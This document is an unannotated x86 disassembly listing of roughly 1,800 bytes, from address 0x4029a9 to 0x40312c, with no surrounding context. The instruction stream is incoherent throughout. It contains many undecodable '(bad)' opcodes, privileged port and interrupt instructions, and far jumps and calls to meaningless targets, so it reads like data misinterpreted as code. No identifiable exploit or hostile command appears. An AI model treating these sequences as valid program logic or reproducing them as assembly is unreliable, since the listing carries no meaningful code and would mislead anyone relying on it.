  4029a9:	scas   eax,DWORD PTR es:[edi]
  4029aa:	push   ecx
  4029ab:	push   esi
  4029ac:	aaa    
  4029ad:	xor    DWORD PTR [eax],ebx
  4029af:	jo     0x402972
  4029b1:	push   ecx
  4029b2:	inc    ebp
  4029b3:	(bad)  
  4029b4:	test   eax,0xf2493f68
  4029b9:	pusha  
  4029ba:	xor    eax,0x9dc3d6b7
  4029bf:	mov    esp,0xfdcbe2a8
  4029c4:	daa    
  4029c5:	je     0x4029fa
  4029c7:	lods   al,BYTE PTR ds:[esi]
  4029c8:	mov    edi,0x41c30ee6
  4029cd:	push   edi
  4029ce:	inc    ebx
  4029cf:	arpl   WORD PTR [edx-0x2be62788],dx
  4029d5:	mov    ah,0xc1
  4029d7:	push   ebx
  4029d8:	jmp    0xffe5:0xfa58764c
  4029df:	sbb    DWORD PTR ds:0x5a65236d,esi
  4029e5:	ins    BYTE PTR es:[edi],dx
  4029e6:	push   0xffffff94
  4029e8:	pop    ebp
  4029e9:	xchg   edx,eax
  4029ea:	gs push ebx
  4029ec:	mov    DWORD PTR [ebp+eax*4-0x4a],edi
  4029f0:	jb     0x4029ba
  4029f2:	in     eax,dx
  4029f3:	test   BYTE PTR [edi+0x6f],dh
  4029f6:	pop    ebx
  4029f7:	and    eax,0xb706ab9e
  4029fc:	sub    ebp,DWORD PTR [ebp+esi*4-0x621d39b2]
  402a03:	adc    dh,dl
  402a05:	or     eax,0xd21d6224
  402a0a:	push   ebx
  402a0b:	push   DWORD PTR [esi+0x5]
  402a0e:	sub    DWORD PTR [ebp+eiz*2+0x451a7479],0x603eac43
  402a19:	inc    ebx
  402a1a:	cs mov eax,0xa3784474
  402a20:	inc    edx
  402a21:	mov    bl,0xbd
  402a23:	pop    es
  402a24:	jb     0x4029a9
  402a26:	mov    cs,WORD PTR [edx+eax*4+0x15c3d1c4]
  402a2d:	add    BYTE PTR [edi-0x56],dl
  402a30:	por    mm7,mm0
  402a33:	jno    0x402a8d
  402a35:	in     eax,dx
  402a36:	jl     0x402a6d
  402a38:	mov    BYTE PTR [edi+0xe5a1f5e],al
  402a3e:	(bad)  
  402a3f:	jmp    0x3613:0x7dfeaa0f
  402a46:	xor    dl,BYTE PTR [edi]
  402a48:	(bad)  
  402a49:	mov    bl,0xe3
  402a4b:	cmp    ebp,DWORD PTR [ebx-0x13]
  402a4e:	jae    0x402a28
  402a50:	ins    BYTE PTR es:[edi],dx
  402a51:	test   eax,0x882e300d
  402a56:	stc    
  402a57:	sub    al,0x9
  402a59:	mov    ds:0x772a1291,eax
  402a5e:	xor    eax,0x32b4e9b
  402a63:	jmp    0x23845655
  402a68:	ja     0x402abc
  402a6a:	push   ds
  402a6b:	jns    0x402a65
  402a6d:	addr16 mov dh,0xdd
  402a70:	sti    
  402a71:	stos   BYTE PTR es:[edi],al
  402a72:	xor    eax,0x3d0b0e71
  402a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a78:	mov    ecx,0x62d39603
  402a7d:	lock mov WORD PTR [edi-0x1b],fs
  402a81:	and    al,0x44
  402a83:	mov    dl,0xe8
  402a85:	and    ebp,esp
  402a87:	jmp    0x1a1962b2
  402a8c:	mov    dl,bh
  402a8e:	add    BYTE PTR [edx],ah
  402a90:	push   ds
  402a91:	retf   0x8181
  402a94:	rcl    BYTE PTR [eax+0x6c],0x51
  402a98:	cmp    BYTE PTR [edx-0x487fbadf],cl
  402a9e:	bound  eax,QWORD PTR [eax]
  402aa0:	sub    ebp,0x48
  402aa3:	call   0x2736:0x99c8bf20
  402aaa:	icebp  
  402aab:	or     BYTE PTR [ebp-0x59],0x71
  402aaf:	mov    ds:0xc242a1e4,eax
  402ab4:	mov    esi,0xfa5ad827
  402ab9:	cmp    eax,0x1a788d0b
  402abe:	cmp    esi,ebp
  402ac0:	and    esp,ecx
  402ac2:	popa   
  402ac3:	test   eax,0xd71a2599
  402ac8:	fnstenv [edi-0x49]
  402acb:	pop    esp
  402acc:	dec    ecx
  402acd:	xchg   esi,eax
  402ace:	xor    BYTE PTR [ebx+0x77b6463],bl
  402ad4:	or     BYTE PTR [edx],bl
  402ad6:	jae    0x402ac9
  402ad8:	or     BYTE PTR [edi+ecx*2-0xe455c3],0xc6
  402ae0:	mov    BYTE PTR [ecx+0x7f],cl
  402ae3:	mov    ds:0x29502479,eax
  402ae8:	stos   BYTE PTR es:[edi],al
  402ae9:	and    eax,0x9f9f29ac
  402aee:	inc    eax
  402aef:	jo     0x402b16
  402af1:	xchg   esp,eax
  402af2:	adc    esp,edi
  402af4:	adc    esp,eax
  402af6:	leave  
  402af7:	pop    ss
  402af8:	lods   eax,DWORD PTR ds:[esi]
  402af9:	(bad)  
  402afa:	cmp    DWORD PTR [edi*4+0x61f41cea],eax
  402b01:	xor    esi,ebx
  402b03:	std    
  402b04:	pop    es
  402b05:	rcl    BYTE PTR [ebp+0x1],0xa7
  402b09:	xlat   BYTE PTR ds:[ebx]
  402b0a:	(bad)  
  402b0b:	sahf   
  402b0c:	fwait
  402b0d:	xor    eax,ebx
  402b0f:	push   cs
  402b10:	mov    ebx,0xcc5a5aa1
  402b15:	inc    ecx
  402b16:	dec    esi
  402b17:	xchg   edx,eax
  402b18:	ret    0xde2f
  402b1b:	or     BYTE PTR [edx+edx*1+0x6d],bl
  402b1f:	scas   al,BYTE PTR es:[edi]
  402b20:	cdq    
  402b21:	xchg   edx,eax
  402b22:	cdq    
  402b23:	imul   esp,DWORD PTR [edx*8-0x46dd3d69],0x53
  402b2b:	and    BYTE PTR [esi+0x7c],0xf6
  402b2f:	cwde   
  402b30:	(bad)  
  402b31:	push   0x526810ad
  402b36:	inc    esp
  402b37:	push   esi
  402b38:	fld    DWORD PTR [ebx-0x40fe2877]
  402b3e:	pusha  
  402b3f:	scas   al,BYTE PTR es:[edi]
  402b40:	rol    BYTE PTR [ebx+0x6e],1
  402b43:	or     dl,cl
  402b45:	mov    ebx,DWORD PTR [esi-0x55]
  402b48:	mov    bl,0x42
  402b4a:	cmp    dl,ah
  402b4c:	cwde   
  402b4d:	push   eax
  402b4e:	test   DWORD PTR [esi+0x8ad4299],edi
  402b54:	sub    BYTE PTR [ebx],dl
  402b56:	addr16 mov dl,0xa1
  402b59:	scas   al,BYTE PTR es:[edi]
  402b5a:	push   esi
  402b5b:	sti    
  402b5c:	sub    al,0xa8
  402b5e:	popa   
  402b5f:	es retf 0x59f
  402b63:	xchg   esi,eax
  402b64:	mov    ds:0xfa0cb3ed,al
  402b69:	iret   
  402b6a:	sahf   
  402b6b:	or     BYTE PTR [ecx+0x78abeaaa],bh
  402b71:	ret    
  402b72:	push   edi
  402b73:	mov    bh,bl
  402b75:	outs   dx,DWORD PTR ds:[esi]
  402b76:	lock rcr al,cl
  402b79:	(bad)  
  402b7a:	lahf   
  402b7b:	adc    BYTE PTR [edi-0x78],dl
  402b7e:	ret    0x5c69
  402b81:	shl    bh,cl
  402b83:	mov    DWORD PTR [edi+eax*8],ebp
  402b86:	repnz mov bh,0x71
  402b89:	(bad)  
  402b8a:	push   ds
  402b8b:	mov    ch,0x52
  402b8d:	lea    ebp,[eax-0x77]
  402b90:	mov    bh,0x16
  402b92:	jo     0x402b66
  402b94:	imul   ebp,DWORD PTR [eax-0x60a80e98],0x48
  402b9b:	cmp    eax,0x900c5343
  402ba0:	mov    dl,0x8d
  402ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ba3:	jge    0x402b6b
  402ba5:	jp     0x402b83
  402ba7:	xchg   esp,eax
  402ba8:	int    0x34
  402baa:	out    dx,eax
  402bab:	lds    ebx,FWORD PTR ds:0xca9c0ce9
  402bb1:	jns    0x402bd6
  402bb3:	test   BYTE PTR [eax+0x15],bl
  402bb6:	pop    ebx
  402bb7:	cmp    eax,DWORD PTR [ebp-0x6198cfbf]
  402bbd:	hlt    
  402bbe:	jg     0x402bb5
  402bc0:	fsubr  DWORD PTR [edi]
  402bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc3:	push   eax
  402bc4:	xchg   ecx,eax
  402bc5:	pop    ss
  402bc6:	xchg   edx,eax
  402bc7:	mov    ecx,0xf0fa7257
  402bcc:	ret    
  402bcd:	dec    ebp
  402bce:	aad    0x11
  402bd0:	(bad)  
  402bd1:	in     al,dx
  402bd2:	adc    BYTE PTR [ebp+0x2dfd5714],al
  402bd8:	mov    ds:0x87add7b2,eax
  402bdd:	cli    
  402bde:	jg     0x402c18
  402be0:	dec    edi
  402be1:	fcomp  QWORD PTR [esi]
  402be3:	out    dx,al
  402be4:	out    0xe3,al
  402be6:	(bad)  
  402be8:	aas    
  402be9:	xchg   ebx,eax
  402bea:	mov    dh,0x30
  402bec:	les    ecx,FWORD PTR [esi-0x46725a5f]
  402bf2:	mov    esp,0x22010d9
  402bf7:	or     DWORD PTR [edx],eax
  402bf9:	push   es
  402bfa:	fadd   DWORD PTR [ecx+0x2f345a51]
  402c00:	or     eax,0xf2bf0f6b
  402c05:	ret    
  402c06:	mov    edi,0x83e115a4
  402c0b:	ja     0x402c3b
  402c0d:	adc    edi,ebp
  402c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c10:	xchg   ebp,eax
  402c11:	or     al,0x83
  402c13:	mov    edi,0x7f1a91d7
  402c18:	dec    ebx
  402c19:	test   al,0x57
  402c1b:	enter  0x1ecd,0x86
  402c1f:	sub    BYTE PTR [edx+0x1a],bl
  402c22:	xchg   esi,eax
  402c23:	inc    ebp
  402c24:	aam    0x6
  402c26:	pop    ds
  402c27:	dec    ebp
  402c28:	dec    ebx
  402c29:	nop
  402c2a:	ins    DWORD PTR es:[edi],dx
  402c2b:	or     al,0xeb
  402c2d:	out    0x6e,al
  402c2f:	and    DWORD PTR [eax-0x452c69a4],ecx
  402c35:	retf   0x571a
  402c38:	or     dh,BYTE PTR [ecx-0x73215f30]
  402c3e:	xor    BYTE PTR [ecx+0x58010fdc],ch
  402c44:	or     ebx,DWORD PTR [edi-0x34]
  402c47:	cli    
  402c48:	popf   
  402c49:	mov    dh,0x9c
  402c4b:	test   al,0x2c
  402c4d:	push   edx
  402c4e:	lahf   
  402c4f:	sub    eax,0xd9f9413e
  402c54:	imul   esp,DWORD PTR [esi],0xfffffff9
  402c57:	push   ds
  402c58:	(bad)  
  402c59:	addr16 add ch,cl
  402c5c:	mov    ah,0xbe
  402c5e:	mov    dl,0xdc
  402c60:	daa    
  402c61:	(bad)  
  402c62:	xor    edi,eax
  402c64:	push   0xfffffff0
  402c66:	jno    0x402cc1
  402c68:	add    eax,DWORD PTR [eax]
  402c6a:	hlt    
  402c6b:	and    BYTE PTR ds:[edx+0x7c046c9d],ah
  402c72:	imul   esp,DWORD PTR [eax-0x4f],0x6d
  402c76:	and    eax,0xf39eb0a0
  402c7b:	push   ebp
  402c7c:	arpl   WORD PTR [edi-0x766de950],bp
  402c82:	pop    esi
  402c83:	jge    0x402d00
  402c85:	fild   QWORD PTR [esi+0x7]
  402c88:	fs sub eax,0x553d4003
  402c8e:	shl    BYTE PTR [eax-0x15],0x81
  402c92:	pop    eax
  402c93:	sub    BYTE PTR [ebx-0x55],0xf6
  402c97:	mov    ds,WORD PTR [ebp-0x3c]
  402c9a:	push   ss
  402c9b:	shl    DWORD PTR [ebp+0x51],1
  402c9e:	inc    ebx
  402c9f:	mov    dh,bl
  402ca1:	jge    0x402c92
  402ca3:	arpl   WORD PTR [ebp-0x1b],di
  402ca6:	and    BYTE PTR [ecx],ah
  402ca8:	or     DWORD PTR [eax],esp
  402caa:	push   0xffffffea
  402cac:	dec    eax
  402cad:	retf   0xf338
  402cb0:	ret    0xd403
  402cb3:	hlt    
  402cb4:	push   eax
  402cb5:	mov    ds:0xe5f52ec8,eax
  402cba:	popa   
  402cbb:	scas   eax,DWORD PTR es:[edi]
  402cbc:	fxch   st(6)
  402cbe:	jae    0x402d31
  402cc0:	enter  0x3af4,0xab
  402cc4:	test   eax,0x27e1bcaf
  402cc9:	xor    eax,0xc31b14d9
  402cce:	lea    esp,[eax]
  402cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd1:	cwde   
  402cd2:	push   esp
  402cd3:	outs   dx,DWORD PTR ds:[esi]
  402cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd5:	not    esp
  402cd7:	das    
  402cd8:	ret    
  402cd9:	lods   al,BYTE PTR ds:[esi]
  402cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cdb:	daa    
  402cdc:	jmp    0x7180:0xd13efeee
  402ce3:	pushf  
  402ce4:	test   BYTE PTR [edx],ah
  402ce6:	es mov al,0x21
  402ce9:	xchg   esp,eax
  402cea:	test   al,0x75
  402cec:	pop    esi
  402ced:	xchg   esp,eax
  402cee:	xor    al,0x83
  402cf0:	cs push esp
  402cf2:	jmp    0x402ca0
  402cf4:	xchg   esi,eax
  402cf5:	std    
  402cf6:	push   ds
  402cf7:	push   0x23e7dddc
  402cfc:	dec    esi
  402cfd:	sbb    al,al
  402cff:	sub    BYTE PTR [edx+0x5],dh
  402d02:	out    0xa4,al
  402d04:	inc    DWORD PTR [edi+edx*1+0x4f]
  402d08:	and    edx,DWORD PTR [eax+edi*8+0x1d965ef1]
  402d0f:	enter  0x7fab,0x44
  402d13:	je     0x402cf9
  402d15:	cmp    al,0xbe
  402d17:	fdivr  QWORD PTR [edx+ebp*2+0x65]
  402d1b:	jp     0x402d5e
  402d1d:	xor    BYTE PTR [edx+0x3e],al
  402d20:	sub    al,0xe8
  402d22:	rcr    DWORD PTR [edi],1
  402d24:	sub    eax,0x14ddd72c
  402d29:	mov    ch,0x45
  402d2b:	aad    0xa9
  402d2d:	jnp    0x402cc9
  402d2f:	sbb    ebx,0x1b
  402d32:	inc    esi
  402d33:	aas    
  402d34:	sub    edx,DWORD PTR [edx+edi*4-0x40ea12bb]
  402d3b:	frstor [edi+eiz*2-0x58]
  402d3f:	inc    ebx
  402d40:	sbb    BYTE PTR [edx-0x1ef7adcf],0xd6
  402d47:	out    dx,al
  402d48:	iret   
  402d49:	je     0x402d7f
  402d4b:	retf   
  402d4c:	fcom   QWORD PTR [esi+0xd]
  402d4f:	pop    ebx
  402d50:	jbe    0x402da8
  402d52:	daa    
  402d53:	mov    al,0x45
  402d55:	inc    edi
  402d56:	pop    edx
  402d57:	into   
  402d58:	loope  0x402dc6
  402d5a:	dec    ecx
  402d5b:	push   0xffffffe3
  402d5d:	(bad)  
  402d5e:	jnp    0x402d44
  402d60:	lea    esp,[edi+0x608b345a]
  402d66:	sub    BYTE PTR [esp+eiz*2],dh
  402d69:	std    
  402d6a:	outs   dx,DWORD PTR ds:[esi]
  402d6b:	jnp    0x402d42
  402d6d:	sub    al,0xd4
  402d6f:	jo     0x402dce
  402d71:	nop
  402d72:	jp     0x402d74
  402d74:	rcr    BYTE PTR [ebp-0x4a],1
  402d77:	mov    edx,0x2e764782
  402d7c:	fs jmp 0xe0b1e24a
  402d82:	fmul   st(5),st
  402d84:	cmp    al,0x4
  402d86:	sbb    BYTE PTR [ecx-0x1dd85761],bl
  402d8c:	dec    ecx
  402d8d:	arpl   WORD PTR [ecx+0x38],dx
  402d90:	cmp    DWORD PTR [ebp+0x76],0xffffffbf
  402d94:	aad    0x4a
  402d96:	jl     0x402d20
  402d98:	dec    esp
  402d99:	idiv   BYTE PTR [ebx]
  402d9b:	fwait
  402d9c:	sti    
  402d9d:	sar    DWORD PTR [ebx+0x34],cl
  402da0:	mov    ebp,fs
  402da2:	addr16 aam 0xad
  402da5:	pushf  
  402da6:	test   al,0x6d
  402da8:	fadd   QWORD PTR [edx]
  402daa:	or     al,0x57
  402dac:	sub    DWORD PTR [edx-0x33],edx
  402daf:	(bad)  
  402db0:	(bad)  
  402db1:	js     0x402d33
  402db3:	mov    esp,0x75325cac
  402db8:	adc    eax,0xd52432da
  402dbd:	int3   
  402dbe:	push   ss
  402dbf:	pop    ebp
  402dc0:	dec    ebp
  402dc1:	sbb    eax,0xd6b16b39
  402dc6:	xchg   ecx,eax
  402dc7:	ficom  DWORD PTR [edi+0x316f61be]
  402dcd:	xchg   edx,eax
  402dce:	stos   DWORD PTR es:[edi],eax
  402dcf:	and    eax,0x2d15fd12
  402dd4:	add    BYTE PTR [ebp-0x10293ccc],ah
  402dda:	lahf   
  402ddb:	neg    DWORD PTR [edi+eax*4+0x609df8f2]
  402de2:	lahf   
  402de3:	aas    
  402de4:	retf   0x2264
  402de7:	push   ebp
  402de8:	xchg   DWORD PTR [ebx+0x59],esp
  402deb:	scas   al,BYTE PTR es:[edi]
  402dec:	pusha  
  402ded:	xchg   esp,eax
  402dee:	cwde   
  402def:	and    DWORD PTR ds:0xf3911cc3,esp
  402df5:	sub    al,BYTE PTR [esi]
  402df7:	pop    eax
  402df8:	xor    eax,0x5e82287a
  402dfd:	out    dx,al
  402dfe:	(bad)  
  402dff:	push   ss
  402e00:	out    0x1a,eax
  402e02:	sbb    BYTE PTR [edi],dh
  402e04:	rcl    BYTE PTR [ebp+0x14],cl
  402e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e08:	mov    al,ds:0xc33b367c
  402e0d:	shr    ebx,1
  402e0f:	arpl   WORD PTR [edx],bx
  402e11:	mov    bl,0xa5
  402e13:	int3   
  402e14:	and    ecx,DWORD PTR [eax-0x4a]
  402e17:	xor    DWORD PTR ds:0x6cec5489,eax
  402e1d:	cmp    DWORD PTR [edi],ebp
  402e1f:	jb     0x402e6e
  402e21:	mul    cl
  402e23:	cmp    BYTE PTR [ecx],ch
  402e25:	inc    esi
  402e26:	out    0x88,eax
  402e28:	idiv   DWORD PTR [esi+edx*8+0x31]
  402e2c:	cmovge esp,DWORD PTR [edi-0x3b24c76f]
  402e33:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402e35:	fisttp QWORD PTR [edx+esi*1+0x51]
  402e39:	mov    ecx,0x7758ba3
  402e3e:	pusha  
  402e3f:	gs leave 
  402e41:	inc    ebp
  402e42:	daa    
  402e43:	jmp    0x402dce
  402e45:	(bad)  
  402e46:	mov    ch,0x8b
  402e48:	addr16 clc 
  402e4a:	stos   DWORD PTR es:[edi],eax
  402e4b:	xchg   esi,eax
  402e4c:	add    DWORD PTR [edi-0x5f],ebp
  402e4f:	pop    esi
  402e50:	in     eax,0xec
  402e52:	lods   al,BYTE PTR ds:[esi]
  402e53:	push   edi
  402e54:	js     0x402e04
  402e56:	aaa    
  402e57:	inc    eax
  402e58:	aaa    
  402e59:	int3   
  402e5a:	sbb    DWORD PTR [esi],edx
  402e5c:	div    DWORD PTR [ecx]
  402e5e:	xor    edi,ebp
  402e60:	adc    BYTE PTR [eax],dh
  402e62:	mov    ebp,0xb7b37b0d
  402e67:	mov    ds:0x6de1e055,eax
  402e6c:	jmp    0xcd76:0x5a87cf7b
  402e73:	push   ecx
  402e74:	cs cmp eax,0xb042dc7c
  402e7a:	int    0x7a
  402e7c:	add    DWORD PTR [esi],esi
  402e7e:	dec    ecx
  402e7f:	jmp    FWORD PTR [ebx+0x30908cda]
  402e85:	pop    es
  402e86:	or     al,0xef
  402e88:	rcl    ah,cl
  402e8a:	cdq    
  402e8b:	call   0xed23fa1b
  402e90:	clc    
  402e91:	push   edi
  402e92:	mov    ch,0xdb
  402e94:	fsubr  DWORD PTR [ebp+0x6e67133c]
  402e9a:	xor    ebp,DWORD PTR [edx]
  402e9c:	mov    esp,0x5475e6ff
  402ea1:	xchg   ebp,eax
  402ea2:	xchg   DWORD PTR [edi],ebp
  402ea4:	fstp   TBYTE PTR [eax]
  402ea6:	xchg   edx,eax
  402ea7:	cwde   
  402ea8:	or     BYTE PTR [edi-0x40],ch
  402eab:	and    eax,0xdba48bfd
  402eb0:	xlat   BYTE PTR ds:[ebx]
  402eb1:	pop    eax
  402eb2:	push   ecx
  402eb3:	pop    edx
  402eb4:	lahf   
  402eb5:	push   ebx
  402eb6:	jle    0x402edf
  402eb8:	fnstenv [esi]
  402eba:	xlat   BYTE PTR ds:[ebx]
  402ebb:	jae    0x402f0e
  402ebd:	xor    BYTE PTR [edx+0x41],ah
  402ec0:	arpl   WORD PTR [eax+ecx*1],sp
  402ec3:	adc    al,dl
  402ec5:	dec    esp
  402ec6:	(bad)  
  402ec7:	stc    
  402ec8:	xor    ebx,DWORD PTR ds:0x8ccdeb46
  402ece:	pop    ebx
  402ecf:	mov    dl,0x47
  402ed1:	iret   
  402ed2:	jge    0x402ec5
  402ed4:	es mov al,0x99
  402ed7:	push   DWORD PTR [ebp+0xa22be6c]
  402edd:	das    
  402ede:	or     eax,0x7687b59
  402ee3:	sub    BYTE PTR [ecx+0x26],ch
  402ee6:	(bad)  
  402ee7:	in     eax,dx
  402ee8:	fisttp DWORD PTR [eax]
  402eea:	in     eax,0x75
  402eec:	mov    ss,WORD PTR [ebx+0x6e]
  402eef:	jb     0x402e78
  402ef1:	add    BYTE PTR [ecx+0x61],ch
  402ef4:	dec    edi
  402ef5:	aas    
  402ef6:	int    0xad
  402ef8:	rcl    dh,0x5b
  402efb:	mov    ecx,0x7562620c
  402f00:	mov    ds:0x5eed27ca,eax
  402f05:	jmp    0xe889b6c6
  402f0a:	into   
  402f0b:	jmp    0x402f21
  402f0d:	sub    DWORD PTR [eax-0x9e34ce7],0x5ab08a6b
  402f17:	push   edx
  402f18:	and    al,BYTE PTR [esi-0x1ff02107]
  402f1e:	sub    dh,BYTE PTR [edi+0x61]
  402f21:	call   0xc5c96ad
  402f26:	mov    dh,0x51
  402f28:	xor    BYTE PTR [esi-0x7a02d103],ah
  402f2e:	ins    BYTE PTR es:[edi],dx
  402f2f:	fldenv [edx+esi*8]
  402f32:	mov    WORD PTR [ebp-0x27],es
  402f35:	pop    ecx
  402f36:	xor    BYTE PTR [esi],bl
  402f38:	sbb    BYTE PTR [eax],ah
  402f3a:	test   eax,0x3537411f
  402f3f:	pop    ebx
  402f40:	push   0xf42ebe9d
  402f45:	add    eax,0xb9f0c51a
  402f4a:	sub    al,0xd9
  402f4c:	js     0x402f57
  402f4e:	sbb    ebp,DWORD PTR [ebp+edi*8+0x5a]
  402f52:	xchg   esp,eax
  402f53:	fmul   DWORD PTR [ecx+0x65]
  402f56:	adc    edi,DWORD PTR [ebx+0x6d]
  402f59:	out    0x4a,eax
  402f5b:	mov    al,ds:0x46130926
  402f60:	inc    edx
  402f61:	cmp    DWORD PTR [ebp-0x61],ecx
  402f64:	adc    ecx,DWORD PTR cs:[edx+0xe]
  402f68:	imul   eax,DWORD PTR [esi+edi*4+0x72a5abc0],0xb1e88237
  402f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f74:	daa    
  402f75:	hlt    
  402f76:	inc    ecx
  402f77:	push   es
  402f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f79:	sbb    eax,0xd2b8dad9
  402f7e:	mov    edi,0xb13efc4
  402f83:	dec    ebx
  402f84:	hlt    
  402f85:	jg     0x402f47
  402f87:	pop    es
  402f88:	mov    eax,ds:0x42705d50
  402f8d:	mov    al,ds:0xfde72b32
  402f92:	in     al,dx
  402f93:	popf   
  402f94:	retf   
  402f95:	jg     0x402f8c
  402f97:	mov    ds:0x50b71980,al
  402f9c:	mov    ah,0x6f
  402f9e:	add    eax,0xa850f5b
  402fa3:	push   es
  402fa4:	push   cs
  402fa5:	(bad)  
  402fa7:	xor    dl,ch
  402fa9:	fs push es
  402fab:	cld    
  402fac:	cmp    edx,DWORD PTR [ecx]
  402fae:	xchg   esi,eax
  402faf:	sahf   
  402fb0:	mov    ?,WORD PTR ds:0x277e8291
  402fb6:	pop    esi
  402fb7:	push   eax
  402fb8:	hlt    
  402fb9:	inc    edi
  402fba:	xlat   BYTE PTR ds:[ebx]
  402fbb:	adc    eax,0xde882950
  402fc0:	mul    BYTE PTR [esi]
  402fc2:	push   ecx
  402fc3:	push   cs
  402fc4:	repnz ss cdq 
  402fc7:	scas   al,BYTE PTR es:[edi]
  402fc8:	mov    dh,0x67
  402fca:	inc    ebp
  402fcb:	arpl   WORD PTR [esi-0x79],ax
  402fce:	xor    al,0xa7
  402fd0:	add    ah,ah
  402fd2:	mov    ecx,DWORD PTR [ecx]
  402fd4:	mov    bh,0x43
  402fd6:	ins    BYTE PTR es:[edi],dx
  402fd7:	xchg   ebx,eax
  402fd8:	sub    ch,BYTE PTR [esp+edx*2-0x75e9c2aa]
  402fdf:	in     al,dx
  402fe0:	dec    esi
  402fe1:	sbb    bl,ch
  402fe3:	ins    BYTE PTR es:[edi],dx
  402fe4:	and    bl,bh
  402fe6:	or     DWORD PTR [esi+ebp*1-0x44],eax
  402fea:	lds    esp,FWORD PTR [ebp-0xae87917]
  402ff0:	stos   BYTE PTR es:[edi],al
  402ff1:	xchg   edx,eax
  402ff2:	jb     0x403041
  402ff4:	outs   dx,BYTE PTR ds:[esi]
  402ff5:	hlt    
  402ff6:	lods   eax,DWORD PTR ds:[esi]
  402ff7:	aaa    
  402ff8:	in     eax,0xf6
  402ffa:	xor    ecx,DWORD PTR [edx]
  402ffc:	ret    0x1865
  402fff:	aaa    
  403000:	adc    esp,esp
  403002:	or     ebx,esp
  403004:	mov    eax,ds:0xf9c9f1a2
  403009:	lahf   
  40300a:	out    dx,eax
  40300b:	lds    ebx,FWORD PTR [esi-0x5f]
  40300e:	or     DWORD PTR [ebp-0x641a2786],0x53
  403015:	jb     0x40307f
  403017:	cmp    esp,eax
  403019:	pop    ebp
  40301a:	or     dh,BYTE PTR [edx-0x3d]
  40301d:	jnp    0x402fef
  40301f:	cwde   
  403020:	xchg   esp,eax
  403021:	ret    
  403022:	popf   
  403023:	mov    dh,0xa7
  403025:	fwait
  403026:	mov    ebp,0x17b3f4ce
  40302b:	(bad)  
  40302c:	push   cs
  40302d:	xchg   esi,eax
  40302e:	icebp  
  40302f:	cmp    al,0x41
  403031:	xor    dh,cl
  403033:	xchg   edi,eax
  403034:	icebp  
  403035:	mov    esi,ecx
  403037:	sub    DWORD PTR [edx+0x3e604782],ebx
  40303d:	xor    DWORD PTR [ecx],ebx
  40303f:	and    DWORD PTR [ecx+edi*1+0x66],esi
  403043:	je     0x403028
  403045:	jle    0x402ff6
  403047:	arpl   WORD PTR [edi+0x26dfe1e3],ax
  40304d:	mov    ah,BYTE PTR [ebx+0x6d]
  403050:	stc    
  403051:	in     al,0x87
  403053:	adc    DWORD PTR [ebp+0x58019831],ebx
  403059:	test   al,0xbb
  40305b:	mov    bl,BYTE PTR [eax-0x30]
  40305e:	ins    BYTE PTR es:[edi],dx
  40305f:	(bad)  
  403060:	sub    dh,BYTE PTR [esi]
  403062:	mov    DWORD PTR [eax+0x72],eax
  403065:	lock pop esi
  403067:	and    al,0x16
  403069:	xchg   BYTE PTR [edi+0x9],ah
  40306c:	push   edx
  40306d:	and    BYTE PTR [ebx+eiz*1+0x7f3f430f],cl
  403074:	adc    al,0x8
  403076:	xor    ebp,DWORD PTR [edi]
  403078:	scas   al,BYTE PTR es:[edi]
  403079:	scas   al,BYTE PTR es:[edi]
  40307a:	sti    
  40307b:	jb     0x40307b
  40307d:	push   ds
  40307e:	cld    
  40307f:	and    BYTE PTR [esp+ecx*2+0x75],0x19
  403084:	cmc    
  403085:	adc    al,0x23
  403087:	xor    eax,0xa3c81726
  40308c:	jbe    0x40305b
  40308e:	xor    DWORD PTR [ebp-0x78],ebp
  403091:	popa   
  403092:	or     edi,DWORD PTR [ebx]
  403094:	retf   
  403095:	retf   0x7b09
  403098:	(bad)  
  403099:	cmp    DWORD PTR ds:0x8c432c1f,ebp
  40309f:	and    eax,0x7b3ad78
  4030a4:	and    esi,edx
  4030a6:	call   0xf0eb7f4d
  4030ab:	xlat   BYTE PTR ds:[ebx]
  4030ac:	xor    BYTE PTR [ecx+0x3],0x99
  4030b0:	and    esp,DWORD PTR [eax+0x1990a0e4]
  4030b6:	xor    BYTE PTR [ecx],0x70
  4030b9:	push   edx
  4030ba:	lods   al,BYTE PTR ds:[esi]
  4030bb:	int    0xe3
  4030bd:	xchg   ecx,eax
  4030be:	popf   
  4030bf:	lods   eax,DWORD PTR ds:[esi]
  4030c0:	xchg   edi,eax
  4030c1:	out    0xb7,eax
  4030c3:	adc    DWORD PTR [esi],esi
  4030c5:	pusha  
  4030c6:	es dec ecx
  4030c8:	mov    ss,WORD PTR [eax+ecx*4+0x43]
  4030cc:	push   esi
  4030cd:	popf   
  4030ce:	jmp    0x7c11:0x8259f18
  4030d5:	ds xchg esp,eax
  4030d7:	mov    dh,0xb1
  4030d9:	aaa    
  4030da:	cmp    al,0x38
  4030dc:	cli    
  4030dd:	mov    esp,0x1f8b27f
  4030e2:	or     edx,0x48
  4030e5:	jno    0x40312a
  4030e7:	jle    0x40312e
  4030e9:	or     DWORD PTR [ebx+0x6eafe073],eax
  4030ef:	push   edx
  4030f0:	inc    esi
  4030f1:	out    dx,eax
  4030f2:	mov    ebp,0xf02a593c
  4030f7:	popf   
  4030f8:	mov    esp,0xf04ba7b7
  4030fd:	fdivp  st(0),st
  4030ff:	in     eax,0xd5
  403101:	cdq    
  403102:	mov    dh,BYTE PTR [ebp-0x225f1932]
  403108:	cmp    eax,0x571a893e
  40310d:	jge    0x403178
  40310f:	inc    eax
  403110:	fidivr WORD PTR [edi+edx*8]
  403113:	mov    WORD PTR [eax+0xe3f6a67],fs
  403119:	xchg   DWORD PTR [eax],edi
  40311b:	inc    ecx
  40311c:	lods   eax,DWORD PTR ds:[esi]
  40311d:	cmp    al,0x34
  40311f:	int    0x6
  403121:	push   ss
  403122:	add    edx,DWORD PTR ds:0xdeacf4eb
  403128:	xor    BYTE PTR es:[edi-0x25],al
  40312c:	and    eax,0x96b1f1d8
